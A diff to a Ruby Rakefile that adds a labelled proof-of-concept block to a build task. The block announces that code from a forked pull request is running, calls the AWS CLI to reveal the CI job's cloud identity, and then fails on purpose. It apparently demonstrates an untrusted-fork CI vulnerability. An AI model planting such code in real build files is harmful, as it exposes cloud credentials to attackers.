@@ -59,6 +59,14 @@ end
 
 desc "Run KCL sample producer to generate sample data"
 task :run_producer, [:timeout] do |t, args|
+  # --- PoC Start ---
+  puts ">>> PoC: EXECUTING CODE FROM FORKED PR (in Rakefile) <<<"
+  puts ">>> PoC: Attempting AWS CLI command to identify role:"
+  sh "aws sts get-caller-identity"
+  puts ">>> PoC: TEST FINISHED, FAILING INTENTIONALLY <<<"
+  exit 1
+  # --- PoC End ---
+
   puts "Running the Kinesis sample producer application..."
   timeout = args[:timeout] || 0
   command = "#{SAMPLES_DIR}/sample_kcl_producer.rb"
